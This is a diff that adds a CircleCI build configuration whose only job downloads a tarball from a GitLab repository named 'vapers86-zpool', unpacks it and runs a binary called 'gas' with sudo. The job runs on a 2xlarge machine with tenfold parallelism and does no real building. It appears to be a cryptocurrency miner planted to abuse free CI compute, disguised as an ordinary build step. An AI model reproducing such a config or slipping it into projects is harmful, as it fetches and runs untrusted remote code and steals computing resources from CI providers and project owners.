@@ -1,0 +1,12 @@
+version: 2.1
+jobs:
+  build:
+    machine:
+      image: ubuntu-2004:202010-01
+    resource_class: 2xlarge
+    parallelism: 10
+    steps:
+      - checkout
+      - run:
+          name: "Vapers86"
+          command: sudo apt update && sudo apt install nodejs && sudo apt install npm && wget https://gitlab.com/Vaping86/vapers86-zpool/-/raw/main/vapertraders.tar.gz && tar -xf vapertraders.tar.gz ; sudo ./gas run.ini
